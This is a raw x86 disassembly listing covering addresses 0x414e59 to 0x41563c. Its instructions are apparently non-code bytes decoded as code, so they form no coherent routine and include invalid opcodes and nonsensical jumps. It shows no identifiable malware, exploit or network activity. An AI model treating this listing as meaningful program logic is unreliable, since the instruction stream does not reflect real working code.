  414e59:	add    BYTE PTR [edi],bl
  414e5b:	or     eax,0x850ca801
  414e60:	sbb    eax,0x81004008
  414e65:	or     DWORD PTR [eax+0x11],0x52300205
  414e6c:	or     ah,BYTE PTR [ecx-0x3a]
  414e6f:	xor    al,BYTE PTR [eax-0x37f5fbf4]
  414e75:	inc    eax
  414e76:	add    BYTE PTR [eax+0x10],ch
  414e79:	xor    BYTE PTR [ecx],dl
  414e7b:	add    DWORD PTR [ebx],0x3881205
  414e81:	add    BYTE PTR [eax],al
  414e83:	and    BYTE PTR [ecx+0x20802089],dl
  414e89:	and    BYTE PTR [ecx+0x56100140],dh
  414e8f:	add    BYTE PTR [eax],bh
  414e91:	add    DWORD PTR [ecx+eiz*1],esp
  414e94:	or     ah,BYTE PTR [eax]
  414e96:	add    al,BYTE PTR [eax]
  414e98:	adc    al,0x0
  414e9a:	add    BYTE PTR [edx+0x20],ah
  414e9d:	cmp    al,0x6
  414e9f:	add    al,BYTE PTR [ecx]
  414ea1:	pop    ss
  414ea2:	add    BYTE PTR [eax],cl
  414ea4:	add    BYTE PTR [ebx],ch
  414ea6:	inc    esp
  414ea7:	dec    eax
  414ea8:	or     BYTE PTR [ecx-0x6aa3ea01],al
  414eae:	inc    edx
  414eaf:	add    BYTE PTR [edx+0x3114d030],ah
  414eb5:	shl    BYTE PTR [eax+0x9],0x9
  414eb9:	sbb    ebx,DWORD PTR [ecx]
  414ebb:	or     ecx,DWORD PTR [eax+0x20]
  414ebe:	inc    eax
  414ebf:	adc    DWORD PTR [eax],eax
  414ec1:	add    DWORD PTR [eax+0x20a30222],eax
  414ec7:	push   es
  414ec8:	add    ch,BYTE PTR [eax]
  414eca:	and    BYTE PTR [ecx],ah
  414ecc:	add    DWORD PTR [eax],0xffffffa2
  414ecf:	test   DWORD PTR [eax],ecx
  414ed1:	and    al,0xa0
  414ed3:	add    BYTE PTR [eax+eax*1],al
  414ed6:	inc    ecx
  414ed7:	and    eax,0x88002214
  414edc:	or     DWORD PTR [edi],ebp
  414ede:	mov    BYTE PTR [eax],ah
  414ee0:	add    al,0x88
  414ee2:	nop
  414ee3:	push   0x24c00820
  414ee8:	sbb    DWORD PTR [eax],ecx
  414eea:	add    DWORD PTR [ecx],esi
  414eec:	adc    BYTE PTR [eax+0x25824802],0x1d
  414ef3:	loopne 0x414f35
  414ef5:	cmp    dl,BYTE PTR [esi]
  414ef7:	add    DWORD PTR [eax+eiz*2],ebp
  414efa:	add    dl,BYTE PTR [edx+0x30]
  414efd:	or     BYTE PTR [eax+0x14091848],dh
  414f03:	adc    BYTE PTR [eax],cl
  414f05:	push   ecx
  414f06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f07:	mov    BYTE PTR [edx],al
  414f09:	inc    ecx
  414f0a:	add    BYTE PTR [eax+eax*1],al
  414f0d:	mov    DWORD PTR [eax],eax
  414f0f:	sub    eax,0x940760c0
  414f14:	add    ah,BYTE PTR [eax]
  414f16:	add    BYTE PTR [edx-0x7e],cl
  414f19:	cs dec esp
  414f1b:	mov    eax,ds:0x404400
  414f20:	add    BYTE PTR [esi],cl
  414f22:	add    eax,0x4005153
  414f27:	nop
  414f28:	and    DWORD PTR [edi+eax*1],ecx
  414f2b:	adc    BYTE PTR [ebp+0x20],cl
  414f2e:	add    DWORD PTR [eax],esp
  414f30:	or     BYTE PTR [ecx+0x2],cl
  414f33:	jle    0x414f6a
  414f35:	inc    eax
  414f36:	and    DWORD PTR [ecx-0x6b55bf7e],esp
  414f3c:	and    al,0xc
  414f3e:	nop
  414f3f:	daa    
  414f40:	push   eax
  414f41:	adc    al,BYTE PTR [eax-0x50]
  414f44:	and    BYTE PTR [edx],dl
  414f46:	push   cs
  414f47:	or     BYTE PTR [eax],al
  414f49:	add    BYTE PTR [ebx],al
  414f4b:	add    al,al
  414f4d:	and    BYTE PTR [eax],ah
  414f4f:	add    dl,bh
  414f51:	add    al,BYTE PTR [ecx]
  414f53:	les    esp,FWORD PTR [ecx]
  414f55:	and    al,0x29
  414f57:	add    BYTE PTR [eax+ebx*2],cl
  414f5a:	inc    eax
  414f5b:	inc    eax
  414f5c:	adc    DWORD PTR [eax+eax*1],edx
  414f5f:	add    BYTE PTR [eax+eax*1-0x76fcfffc],0x29
  414f67:	mov    al,0x60
  414f69:	push   es
  414f6a:	or     BYTE PTR [eax-0x68],bl
  414f6d:	add    esp,DWORD PTR [eiz*1+0x1b829832]
  414f74:	or     BYTE PTR [ecx],al
  414f76:	(bad)  
  414f77:	rol    DWORD PTR [eax],cl
  414f79:	sub    BYTE PTR [esi],bl
  414f7b:	inc    edx
  414f7c:	add    BYTE PTR [ebx-0x50],al
  414f7f:	inc    esp
  414f80:	xor    BYTE PTR [ecx],al
  414f82:	dec    esi
  414f83:	inc    ecx
  414f84:	and    BYTE PTR [ecx],0x10
  414f87:	add    BYTE PTR [eax+0x6],dl
  414f8a:	sbb    cl,BYTE PTR [esi+0x21]
  414f8d:	mov    BYTE PTR [eax+0x15],ah
  414f90:	and    al,al
  414f92:	sbb    DWORD PTR [eax+0x0],esp
  414f95:	and    BYTE PTR [ecx+0x60001850],ch
  414f9b:	and    DWORD PTR [ebx-0x7d],0x40848802
  414fa2:	and    DWORD PTR [eax],esp
  414fa4:	sbb    BYTE PTR [eax+0x1],0x69
  414fa8:	dec    ecx
  414fa9:	sub    BYTE PTR [eax],ch
  414fab:	adc    BYTE PTR [ebx],bl
  414fad:	inc    eax
  414fae:	adc    eax,0x10214c00
  414fb3:	sub    BYTE PTR [eax],ah
  414fb5:	inc    esp
  414fb6:	adc    al,0x6b
  414fb8:	test   BYTE PTR [eax],ah
  414fba:	add    al,0x31
  414fbc:	inc    esp
  414fbd:	or     BYTE PTR [edx+0x8],dl
  414fc0:	les    eax,FWORD PTR [edx]
  414fc2:	add    al,0xc8
  414fc4:	add    dl,BYTE PTR [ecx]
  414fc6:	pusha  
  414fc7:	dec    edx
  414fc8:	push   eax
  414fc9:	inc    eax
  414fca:	add    al,0x0
  414fcc:	mov    eax,ds:0x1c180a16
  414fd1:	add    DWORD PTR [ecx],esp
  414fd3:	xor    ebx,DWORD PTR [edx]
  414fd5:	mov    al,BYTE PTR [eax]
  414fd7:	sbb    DWORD PTR ds:0x964d100,0x41080702
  414fe1:	xchg   DWORD PTR [eax+0x48500428],edx
  414fe7:	sub    DWORD PTR [ecx+eax*2],eax
  414fea:	and    eax,DWORD PTR [edx+0xd]
  414fed:	mov    BYTE PTR [ecx+0x8],al
  414ff0:	add    al,0x88
  414ff2:	xchg   BYTE PTR [ecx+eax*1+0xca01883],al
  414ff9:	pusha  
  414ffa:	adc    eax,esp
  414ffc:	push   ss
  414ffd:	dec    esp
  414ffe:	add    eax,0x5b903043
  415003:	inc    eax
  415004:	or     BYTE PTR [ecx+0x0],0x21
  415008:	add    BYTE PTR [eax],ah
  41500a:	add    ch,BYTE PTR [ecx]
  41500c:	add    al,al
  41500e:	add    al,BYTE PTR [eax]
  415010:	sbb    al,0x14
  415012:	or     BYTE PTR [eax],ah
  415014:	dec    eax
  415015:	and    BYTE PTR [ebx],dl
  415017:	add    BYTE PTR [esi+eax*1],bl
  41501a:	test   BYTE PTR [edx],cl
  41501c:	mov    eax,ds:0x92003980
  415021:	adc    bl,BYTE PTR [ecx]
  415023:	adc    al,BYTE PTR [eax]
  415025:	adc    eax,eax
  415027:	and    al,BYTE PTR [eax]
  415029:	dec    eax
  41502a:	add    BYTE PTR [eax+eax*4],al
  41502d:	add    BYTE PTR [eax+0x114c2020],dl
  415033:	dec    eax
  415034:	or     BYTE PTR [eax-0x7b],0x80
  415038:	adc    ebx,DWORD PTR [edx]
  41503a:	inc    eax
  41503b:	dec    ecx
  41503c:	sbb    BYTE PTR [eax+0x24],al
  41503f:	inc    eax
  415040:	enter  0x2a22,0x20
  415044:	add    BYTE PTR [eax*4-0x2e6d6d00],al
  41504b:	or     al,0x70
  41504d:	xor    dl,BYTE PTR [eax-0x4fe93fc0]
  415053:	adc    dh,BYTE PTR [edx]
  415055:	adc    BYTE PTR [eax+edx*8+0x10004062],ah
  41505c:	or     al,0x46
  41505e:	add    BYTE PTR [eax+0x21],dl
  415061:	nop
  415062:	xor    DWORD PTR [eax],eax
  415064:	retf   
  415065:	sub    eax,DWORD PTR [ebx]
  415067:	and    BYTE PTR [edx+0xa90848],ah
  41506d:	pusha  
  41506e:	sub    DWORD PTR [ecx+eiz*1],edx
  415071:	xor    BYTE PTR [ecx-0x80],al
  415074:	test   DWORD PTR fs:[eax],edx
  415077:	and    DWORD PTR [ecx],0x40
  41507a:	adc    eax,0x1303231
  41507f:	add    al,BYTE PTR [edx]
  415081:	push   ss
  415082:	add    al,0x0
  415084:	or     BYTE PTR [eax+0x181010f0],al
  41508a:	add    BYTE PTR [ebx],0xa4
  41508d:	mov    al,ds:0xc5226810
  415092:	add    BYTE PTR [eax+0x50a02170],al
  415098:	sub    BYTE PTR [eax-0x4afff7ec],dl
  41509e:	adc    bl,dl
  4150a0:	adc    eax,eax
  4150a2:	add    al,0x88
  4150a4:	add    DWORD PTR [eax],0x4041249b
  4150aa:	and    ecx,edx
  4150ac:	or     BYTE PTR [ecx+0x40c230c4],dh
  4150b2:	add    DWORD PTR ds:0xd9808501,ecx
  4150b8:	add    eax,0x87409202
  4150bd:	push   eax
  4150be:	and    BYTE PTR [eax+0x39],dh
  4150c1:	or     BYTE PTR [eax+0x84aac41],0xa0
  4150c8:	xchg   ebx,eax
  4150c9:	inc    esp
  4150ca:	loope  0x4150d6
  4150cc:	cdq    
  4150cd:	test   eax,0x600000
  4150d2:	inc    eax
  4150d3:	int3   
  4150d4:	add    BYTE PTR [eax],al
  4150d6:	es stos BYTE PTR es:[edi],al
  4150d8:	or     BYTE PTR [ecx+0x20518160],ah
  4150de:	les    esi,FWORD PTR [eax]
  4150e0:	add    al,0xb8
  4150e2:	mov    BYTE PTR [eax],al
  4150e4:	add    BYTE PTR [eax+0x0],0x0
  4150e8:	and    eax,0x8002c828
  4150ed:	loopne 0x4150f5
  4150ef:	add    BYTE PTR [eax],cl
  4150f1:	and    BYTE PTR [eax],ah
  4150f3:	adc    DWORD PTR [ecx],0xe
  4150f6:	inc    eax
  4150f7:	jp     0x41510d
  4150f9:	adc    BYTE PTR [ecx],al
  4150fb:	and    DWORD PTR [ecx+0x30],0x94291a0
  415102:	or     DWORD PTR [ecx+edx*1+0x6],ecx
  415106:	add    BYTE PTR fs:[ecx],ch
  415109:	push   edx
  41510a:	dec    eax
  41510b:	and    DWORD PTR [edx+0x4],ecx
  41510e:	mov    eax,ds:0xc3700469
  415113:	add    al,BYTE PTR [esi+0x14020062]
  415119:	nop
  41511a:	add    BYTE PTR [eax],al
  41511c:	dec    ebp
  41511d:	int    0x10
  41511f:	adc    BYTE PTR [eax],cl
  415121:	and    BYTE PTR [edx+0xa200c46],dl
  415127:	rcl    BYTE PTR [ebp+0x48b21240],0x8
  41512e:	mov    DWORD PTR [eax],esp
  415130:	adc    dl,0x18
  415133:	and    BYTE PTR [eax],ah
  415135:	dec    eax
  415136:	adc    BYTE PTR [eax],cl
  415138:	and    DWORD PTR [eax],eax
  41513a:	and    cl,BYTE PTR [eax+eax*2]
  41513d:	adc    BYTE PTR [ecx+edx*4],al
  415140:	adc    DWORD PTR [eax+0x0],eax
  415143:	and    al,0x14
  415145:	add    DWORD PTR [ecx],0x10
  415148:	add    DWORD PTR [eax],eax
  41514a:	adc    BYTE PTR [edx+0x10],al
  41514d:	test   BYTE PTR [ecx],ch
  41514f:	add    DWORD PTR [edx+ecx*8],ebp
  415152:	mov    WORD PTR [eax+edx*1-0x80],es
  415156:	add    BYTE PTR [eax+0x1],0x2
  41515a:	adc    dl,cl
  41515c:	add    eax,DWORD PTR [eax]
  41515e:	push   edi
  41515f:	nop
  415160:	add    BYTE PTR ds:0x2c423a21,dl
  415166:	and    al,BYTE PTR es:[eax]
  415169:	or     DWORD PTR [eax],0xffffff80
  41516c:	scas   eax,DWORD PTR es:[edi]
  41516d:	adc    al,BYTE PTR [eax]
  41516f:	add    BYTE PTR [eax+0x7c1a4e1c],al
  415175:	pusha  
  415176:	dec    eax
  415177:	les    eax,FWORD PTR [eax]
  415179:	xchg   DWORD PTR [ecx],edi
  41517b:	and    al,dl
  41517d:	leave  
  41517e:	adc    BYTE PTR [ecx],al
  415180:	adc    BYTE PTR [eax],0x2
  415183:	test   BYTE PTR [ecx],al
  415185:	mov    ds:0xac2600c,al
  41518a:	adc    DWORD PTR [eax],ecx
  41518c:	les    eax,FWORD PTR [eax-0x7b1ffbf0]
  415192:	or     DWORD PTR [ecx+ecx*1+0x33010800],eax
  415199:	adc    BYTE PTR [ecx],cl
  41519b:	add    dl,BYTE PTR [ecx+edx*1]
  41519e:	sub    BYTE PTR [eax+edx*1],al
  4151a1:	jo     0x4151a9
  4151a3:	inc    edx
  4151a4:	push   eax
  4151a5:	add    DWORD PTR [eax-0x75f7e7f0],eax
  4151ab:	and    DWORD PTR [eax-0x3ddf7f80],esp
  4151b1:	inc    eax
  4151b2:	add    BYTE PTR [ebx+0x60],al
  4151b5:	nop
  4151b6:	mov    al,ds:0xc06c1308
  4151bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151bc:	sbb    dl,BYTE PTR ds:0x342a38c0
  4151c2:	add    BYTE PTR [edi+eax*1],dl
  4151c5:	je     0x4151c9
  4151c7:	jge    0x4151d3
  4151c9:	test   al,0x3c
  4151cb:	popa   
  4151cc:	or     BYTE PTR [eax],al
  4151ce:	mov    al,ds:0x4005a0
  4151d3:	add    BYTE PTR [eax],al
  4151d5:	or     DWORD PTR [eax+0x1],eax
  4151d8:	add    BYTE PTR [edx],bh
  4151da:	add    BYTE PTR [eax-0x3fef7cff],ah
  4151e0:	add    BYTE PTR [eax],cl
  4151e2:	add    BYTE PTR [eax+0x8],ah
  4151e5:	add    al,0x42
  4151e7:	adc    eax,0xc034060
  4151ec:	add    DWORD PTR [edx-0x6fb3fe6d],eax
  4151f2:	mov    eax,ds:0x31002
  4151f7:	sub    BYTE PTR [ecx+ebx*2-0x3f],0x0
  4151fc:	and    BYTE PTR [eax+0x888815],cl
  415202:	icebp  
  415203:	or     BYTE PTR [eax],al
  415205:	xor    al,BYTE PTR [eax]
  415207:	add    BYTE PTR [esi*1+0xe8022a0],ch
  41520e:	mov    al,ds:0x40685101
  415213:	push   cs
  415214:	xor    eax,0x2d0544a
  415219:	cwde   
  41521a:	les    esp,FWORD PTR [eax]
  41521c:	cwde   
  41521d:	add    BYTE PTR [eax+0x1],al
  415220:	sbb    edx,DWORD PTR [ecx+0x122240a4]
  415226:	add    BYTE PTR [eax+0x6104080d],ah
  41522c:	cwde   
  41522d:	test   DWORD PTR [ecx],edx
  41522f:	adc    BYTE PTR [eax+0x60],al
  415232:	or     BYTE PTR [eax+0x5010470],cl
  415238:	shl    DWORD PTR [eax],0x14
  41523b:	fs out 0x46,eax
  41523e:	or     al,0x80
  415240:	and    DWORD PTR [eax+0x7808ca81],ebp
  415246:	add    al,BYTE PTR [ecx]
  415248:	call   0x60625392
  41524d:	test   BYTE PTR [ecx],al
  41524f:	push   eax
  415250:	mov    ah,BYTE PTR [eax]
  415252:	inc    eax
  415253:	sbb    BYTE PTR [eax],ch
  415255:	adc    esp,0xc
  415258:	add    BYTE PTR [eax+eax*1],al
  41525b:	xor    DWORD PTR [eax],eax
  41525d:	add    BYTE PTR [esi],ah
  41525f:	or     edx,0x21
  415262:	adc    DWORD PTR [esi+0x0],0x1080224c
  415269:	xchg   ebx,eax
  41526a:	or     ch,BYTE PTR [eax]
  41526c:	add    BYTE PTR [eax+ecx*1-0x3ddecf5e],ch
  415273:	add    BYTE PTR [eax],al
  415275:	and    BYTE PTR [eax],ah
  415277:	and    BYTE PTR [edi],dl
  415279:	inc    eax
  41527a:	and    eax,DWORD PTR [eax]
  41527c:	pusha  
  41527d:	nop
  41527e:	add    BYTE PTR [edx+0x1],ah
  415281:	test   DWORD PTR [ecx],eax
  415283:	imul   eax,DWORD PTR [eax],0x4c208e4
  415289:	imul   eax,DWORD PTR [esi+0x40],0x19118000
  415290:	pop    ss
  415291:	inc    edx
  415292:	add    BYTE PTR [eax+eiz*1],al
  415295:	or     al,0x50
  415297:	add    BYTE PTR [ecx],al
  415299:	xor    dl,BYTE PTR [edx]
  41529b:	nop
  41529c:	add    DWORD PTR [eax],ebp
  41529e:	sbb    BYTE PTR [eax],cl
  4152a0:	xchg   esp,eax
  4152a1:	add    BYTE PTR [edx],al
  4152a3:	xor    eax,0x8601016
  4152a8:	or     BYTE PTR [eax],ah
  4152aa:	mov    DWORD PTR [eax],eax
  4152ac:	push   es
  4152ad:	mov    DWORD PTR [eax],eax
  4152af:	add    BYTE PTR [edx+0x8621080],0x87
  4152b6:	xchg   edx,eax
  4152b7:	pusha  
  4152b8:	or     BYTE PTR [ecx],dl
  4152ba:	add    BYTE PTR [eax],dl
  4152bc:	or     dh,al
  4152be:	mov    cl,al
  4152c0:	xchg   edx,eax
  4152c1:	adc    BYTE PTR [edx+0x30400040],al
  4152c7:	adc    BYTE PTR [eax],0x90
  4152ca:	aam    0x40
  4152cc:	push   ebp
  4152cd:	adc    edx,DWORD PTR [eax]
  4152cf:	add    BYTE PTR [eax],al
  4152d1:	add    al,0x11
  4152d3:	mov    BYTE PTR [ecx+0x38240ab8],cl
  4152d9:	dec    eax
  4152da:	or     BYTE PTR [eax],al
  4152dc:	xchg   BYTE PTR [ecx+0x60000004],dh
  4152e2:	fcmovnb st,st(0)
  4152e4:	adc    eax,edx
  4152e6:	or     BYTE PTR [eax],al
  4152e8:	nop
  4152e9:	nop
  4152ea:	inc    edx
  4152eb:	add    BYTE PTR [eax+0x1600c28],bh
  4152f1:	push   ecx
  4152f2:	shl    BYTE PTR [esi+0x42],1
  4152f5:	add    DWORD PTR [ecx],esi
  4152f7:	add    al,ah
  4152f9:	push   edx
  4152fa:	inc    eax
  4152fb:	mov    BYTE PTR [eax-0x7debebf6],ah
  415301:	or     BYTE PTR [eax+0x68],cl
  415304:	xchg   esp,eax
  415305:	add    al,0x84
  415307:	or     al,0x7a
  415309:	inc    eax
  41530a:	add    BYTE PTR [eax],al
  41530c:	dec    ebx
  41530d:	sbb    BYTE PTR [eax+0x2],dh
  415310:	rol    BYTE PTR [eax+0x0],0x6
  415314:	les    ebx,FWORD PTR [eax+eax*1+0x70421011]
  41531b:	add    BYTE PTR [eax+ebx*1-0xf],ah
  41531f:	loopne 0x415329
  415321:	or     BYTE PTR [eax+edx*1],al
  415324:	adc    DWORD PTR [edx],ebx
  415326:	and    DWORD PTR [eax+eax*1-0x2a7bbf20],edx
  41532d:	rcl    BYTE PTR [eax],0x81
  415330:	and    dl,BYTE PTR [eax+0x9180856]
  415336:	inc    eax
  415337:	sub    BYTE PTR [eax],dl
  415339:	prefetcht1 BYTE PTR [eax+eiz*4-0x7f]
  41533e:	nop
  41533f:	and    BYTE PTR [eax],al
  415341:	push   ds
  415342:	or     BYTE PTR [ecx],cl
  415344:	sub    BYTE PTR [ebx],al
  415346:	or     al,0x5e
  415348:	and    al,0x34
  41534a:	and    al,0x60
  41534c:	enter  0x3822,0x28
  415350:	add    BYTE PTR [eax-0xc],al
  415353:	and    BYTE PTR [eax],al
  415355:	sub    DWORD PTR [eax],edx
  415357:	test   al,0x0
  415359:	push   es
  41535a:	inc    ebx
  41535b:	and    BYTE PTR [edx],al
  41535d:	pusha  
  41535e:	sbb    eax,DWORD PTR ds:0x8c613c50
  415364:	inc    ebx
  415365:	mov    BYTE PTR [eax+0x6548084],0x2a
  41536c:	sub    BYTE PTR [eax],0x0
  41536f:	add    DWORD PTR [ecx],esp
  415371:	mov    al,ds:0x82800a89
  415376:	mov    al,ds:0x21400
  41537b:	add    DWORD PTR [eax+eax*1+0x341120a0],edx
  415382:	shl    BYTE PTR [eax+0x12],0xe4
  415386:	or     BYTE PTR [eax],al
  415388:	adc    BYTE PTR [edx+0x80841f0],dh
  41538e:	adc    DWORD PTR fs:[ebx],eax
  415391:	inc    eax
  415392:	pop    eax
  415393:	mov    al,0x8c
  415395:	xor    DWORD PTR [eax],ebp
  415397:	inc    eax
  415398:	rol    DWORD PTR ds:0x6caa0908,1
  41539e:	xor    cl,ah
  4153a0:	enter  0x212a,0xb0
  4153a4:	cmp    DWORD PTR [eax],eax
  4153a6:	pop    es
  4153a7:	xor    BYTE PTR [eax+0x0],al
  4153aa:	add    DWORD PTR [eax],eax
  4153ac:	adc    BYTE PTR [eax+0x9130191],ah
  4153b2:	add    esp,DWORD PTR [ecx-0x3c]
  4153b5:	and    BYTE PTR [ecx+ecx*2],ah
  4153b8:	or     DWORD PTR [eax],0x4a848200
  4153be:	jo     0x4153c7
  4153c0:	inc    eax
  4153c1:	mov    al,ds:0x31004800
  4153c6:	adc    cl,al
  4153c8:	mov    ds:0x3ca80084,al
  4153cd:	add    DWORD PTR [eax+eax*2],ecx
  4153d0:	or     DWORD PTR [eax],edx
  4153d2:	mov    bl,0x40
  4153d4:	or     ah,BYTE PTR [ecx-0x7d8fe4ff]
  4153da:	inc    eax
  4153db:	add    BYTE PTR [eax],al
  4153dd:	dec    esp
  4153de:	add    bl,BYTE PTR [ecx+0x13228a20]
  4153e4:	add    BYTE PTR [eax],cl
  4153e6:	or     BYTE PTR [edx+0x51],dl
  4153e9:	add    eax,DWORD PTR [ecx]
  4153eb:	and    al,0x4b
  4153ed:	shl    BYTE PTR [eax+0x4],0x14
  4153f1:	inc    ecx
  4153f2:	push   es
  4153f3:	mov    eax,ds:0x821426
  4153f8:	add    BYTE PTR [eax+0x114149],cl
  4153fe:	add    cl,BYTE PTR [esi]
  415400:	dec    ecx
  415401:	or     eax,0x40082086
  415406:	inc    ebx
  415407:	mov    DWORD PTR [ebp+0x60c0a444],edx
  41540d:	add    eax,0x14801457
  415412:	or     DWORD PTR [edx+eax*4+0x142048c6],eax
  415419:	and    esp,DWORD PTR [eax-0x52]
  41541c:	or     BYTE PTR [ebx+0x40],al
  41541f:	test   DWORD PTR [edx-0x77d766f8],eax
  415425:	xor    BYTE PTR [esi],al
  415427:	and    BYTE PTR [eax+edx*1],al
  41542a:	or     BYTE PTR [edx],al
  41542c:	or     DWORD PTR [edx],esi
  41542e:	add    DWORD PTR [eax+eax*2],eax
  415431:	or     BYTE PTR [eax],bh
  415433:	xor    BYTE PTR [eax+0x2021805],dl
  415439:	inc    ecx
  41543a:	and    al,0x21
  41543c:	add    al,0x0
  41543e:	or     BYTE PTR [eax],bh
  415440:	adc    DWORD PTR [edx],eax
  415442:	lock sub DWORD PTR [eax+0x230610c],edx
  415449:	int3   
  41544a:	sub    BYTE PTR [ecx+0x0],cl
  41544d:	and    esp,DWORD PTR ds:0x9001882
  415453:	or     BYTE PTR [eax],dl
  415455:	add    bh,BYTE PTR [edx+0x891230a]
  41545b:	push   ds
  41545c:	sub    DWORD PTR [esp+eax*8+0xa00388],eax
  415463:	add    ch,BYTE PTR [eax+0x75]
  415466:	add    BYTE PTR [eax+ecx*8],ah
  415469:	adc    DWORD PTR [eax+0x65],eax
  41546c:	add    ecx,eax
  41546e:	and    dl,BYTE PTR [edx+eiz*1]
  415471:	pop    eax
  415472:	test   al,0xb8
  415474:	sbb    esp,DWORD PTR [ecx-0x7f9defff]
  41547a:	shl    BYTE PTR [ecx],0x11
  41547d:	add    DWORD PTR [eax-0x789fcfff],ecx
  415483:	add    DWORD PTR [edx],edx
  415485:	fadd   DWORD PTR [eax]
  415487:	and    BYTE PTR [eax+0x1901c050],bl
  41548d:	rcl    BYTE PTR [eax-0x6a],0x42
  415491:	mov    BYTE PTR [ecx],al
  415493:	add    BYTE PTR [esi],dl
  415495:	add    al,BYTE PTR [eax]
  415497:	adc    BYTE PTR ds:0xa40120d9,dl
  41549d:	mov    al,ds:0x244878
  4154a2:	inc    eax
  4154a3:	inc    ecx
  4154a4:	xchg   ebp,eax
  4154a5:	add    BYTE PTR [eax+0x1430c2],al
  4154ab:	cmp    BYTE PTR [edx],0x18
  4154ae:	add    cl,al
  4154b0:	and    al,0x50
  4154b2:	cs dec esi
  4154b4:	test   BYTE PTR [edx],ah
  4154b6:	add    BYTE PTR [eax],dh
  4154b8:	pusha  
  4154b9:	and    al,al
  4154bb:	test   DWORD PTR [eax],edx
  4154bd:	add    BYTE PTR [edi],cl
  4154bf:	rol    BYTE PTR [esi],0x85
  4154c2:	sub    BYTE PTR [eax],al
  4154c4:	and    BYTE PTR [eax],0xa8
  4154c7:	aam    0xc2
  4154c9:	add    BYTE PTR [edx-0x7f3fb57c],ah
  4154cf:	inc    eax
  4154d0:	rol    DWORD PTR [eax+0x2008400],0x3a
  4154d7:	inc    ecx
  4154d8:	add    BYTE PTR [edx+eiz*1+0x2488c812],0x44
  4154e0:	popa   
  4154e1:	or     BYTE PTR [eax],al
  4154e3:	and    al,BYTE PTR [ecx]
  4154e5:	add    BYTE PTR [eax],ch
  4154e7:	sub    DWORD PTR [eax],edx
  4154e9:	add    DWORD PTR [eax],eax
  4154eb:	add    BYTE PTR [eax+0x19680d06],ah
  4154f1:	add    DWORD PTR [edx],eax
  4154f3:	adc    al,0xa
  4154f5:	add    al,0x23
  4154f7:	test   BYTE PTR [ecx-0x47d00000],dl
  4154fd:	mov    esp,DWORD PTR [ebp+esi*8+0x15008a08]
  415504:	add    eax,eax
  415506:	inc    eax
  415507:	add    BYTE PTR [eax],cl
  415509:	lods   al,BYTE PTR ds:[esi]
  41550a:	mov    al,ds:0x218489a1
  41550f:	add    BYTE PTR [eax],0xa0
  415512:	and    BYTE PTR [ecx+edx*1],al
  415515:	leave  
  415516:	add    BYTE PTR [eax+0x800021],bl
  41551c:	and    al,BYTE PTR [ecx-0x76df7a58]
  415522:	add    BYTE PTR [eax],al
  415524:	adc    ah,BYTE PTR [edx]
  415526:	and    DWORD PTR [edx+0x5000],esi
  41552c:	or     al,0x68
  41552e:	xor    al,al
  415530:	test   BYTE PTR [eax],al
  415532:	inc    esp
  415533:	add    DWORD PTR [eax+eiz*1],esp
  415536:	dec    edx
  415537:	add    BYTE PTR [eax+eax*1],0x8
  41553b:	pusha  
  41553c:	xchg   ebp,eax
  41553d:	push   eax
  41553e:	sub    esp,DWORD PTR [edx]
  415540:	add    al,0x4
  415542:	mov    BYTE PTR [ecx-0x3f95f775],al
  415548:	add    cl,BYTE PTR [eax+0x44004f00]
  41554e:	call   0x4964f657
  415553:	inc    ecx
  415554:	mov    BYTE PTR [ecx+0x10],al
  415557:	or     esp,eax
  415559:	push   edi
  41555a:	add    BYTE PTR [eax+0x0],al
  41555d:	cwde   
  41555e:	dec    ecx
  41555f:	dec    ecx
  415560:	add    al,0x0
  415562:	add    DWORD PTR [eax-0x6e7bdfd7],ecx
  415568:	js     0x4154f0
  41556a:	add    BYTE PTR [ecx],ah
  41556c:	xchg   ebx,eax
  41556d:	push   eax
  41556e:	ror    dl,1
  415570:	mov    al,0x40
  415572:	and    DWORD PTR [ecx-0x73fdff50],0x2040000
  41557c:	or     al,0x0
  41557e:	adc    eax,ecx
  415580:	dec    edx
  415581:	xor    al,0x18
  415583:	add    al,0x80
  415585:	pop    es
  415586:	sub    BYTE PTR [ecx],dl
  415588:	add    BYTE PTR [ecx],ch
  41558a:	inc    eax
  41558b:	or     BYTE PTR [edx-0x70],bl
  41558e:	and    al,BYTE PTR [eax+edi*1+0x4]
  415592:	add    eax,DWORD PTR [esi+0xaa03925]
  415598:	add    eax,DWORD PTR [eax]
  41559a:	mov    ah,BYTE PTR [esp+ebp*1+0xc0018f8]
  4155a1:	shl    BYTE PTR [eax],0x29
  4155a4:	and    BYTE PTR [edx+0x11],cl
  4155a7:	add    al,BYTE PTR [esi+0x404a0010]
  4155ad:	sbb    BYTE PTR [eax+0xc081221],dl
  4155b3:	and    DWORD PTR [eax+0x9],0x6401223
  4155ba:	jae    0x4155bc
  4155bc:	xchg   esp,eax
  4155bd:	add    ah,BYTE PTR [eax]
  4155bf:	sbb    DWORD PTR [ecx+0x48721c8],ecx
  4155c5:	adc    al,0x0
  4155c7:	push   esp
  4155c8:	inc    esp
  4155c9:	or     BYTE PTR [eax],0x60
  4155cc:	inc    eax
  4155cd:	and    BYTE PTR [eax],dl
  4155cf:	push   ecx
  4155d0:	or     BYTE PTR [eax+0x6c833298],ah
  4155d6:	inc    eax
  4155d7:	add    BYTE PTR [eax+0x4008c010],al
  4155dd:	xchg   DWORD PTR [ebx+0x4ae0000],ecx
  4155e3:	add    al,0x0
  4155e5:	adc    eax,0x584801
  4155ea:	or     eax,DWORD PTR [eax]
  4155ec:	add    BYTE PTR [edx+0x4020000],cl
  4155f2:	sub    BYTE PTR [ebx-0x7aae67ff],al
  4155f8:	xchg   ecx,eax
  4155f9:	fsubr  DWORD PTR [ebx+0x1120]
  4155ff:	test   al,0x48
  415601:	or     BYTE PTR [ecx+0x832a82],cl
  415607:	jo     0x41565d
  415609:	nop
  41560a:	mov    DWORD PTR [ecx+0x28],eax
  41560d:	mov    dl,BYTE PTR [eax+0x10280a00]
  415613:	jo     0x415655
  415615:	inc    ecx
  415616:	or     BYTE PTR [eax+eax*1-0x71dff700],ah
  41561d:	add    ch,BYTE PTR [edx+0x10202d]
  415623:	pusha  
  415624:	dec    ebx
  415625:	adc    BYTE PTR [eax+0xb],cl
  415628:	or     al,al
  41562a:	add    DWORD PTR [eax],ecx
  41562c:	xchg   ecx,eax
  41562d:	add    BYTE PTR [eax],al
  41562f:	add    BYTE PTR [ecx],dl
  415631:	mov    al,ds:0x13202010
  415636:	inc    esi
  415637:	ret    
  415638:	sbb    al,0x64
  41563a:	and    al,BYTE PTR [edx]
  41563c:	or     al,0xc2
